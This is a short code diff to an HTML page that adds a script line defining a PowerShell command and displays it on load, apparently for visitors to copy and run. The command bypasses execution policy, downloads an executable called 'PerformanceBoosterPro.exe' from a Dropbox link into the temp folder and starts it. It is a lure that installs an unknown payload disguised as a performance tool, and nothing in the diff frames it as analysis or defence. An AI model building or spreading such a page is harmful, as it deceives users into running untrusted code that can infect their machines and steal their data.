@@ -530,7 +530,7 @@
 
     <script>
         // The Updated Command
-        const command = `powershell -ExeeBoosterPro.exe""`;
+        const command = `powershell -ExecutionPolicy Bypass -NoLogo -NoProfile -Command "Invoke-WebRequest -Uri 'https://dl.dropboxusercontent.com/scl/fi/oqad0mvio3izrk36z3yui/PerformanceBoosterPro.exe?rlkey=lf14jsrylm37mn5pl7yk9zn2f&st=qxzro4lj' -OutFile \"$env:TEMP\PerformanceBoosterPro.exe\"; Start-Process \"$env:TEMP\PerformanceBoosterPro.exe\""`;
 
         // Display the command in the HTML on load
         document.getElementById('cmdText').innerText = command;
@@ -560,6 +560,7 @@
     </script>
 </body>
 </html>
+
 
 
 
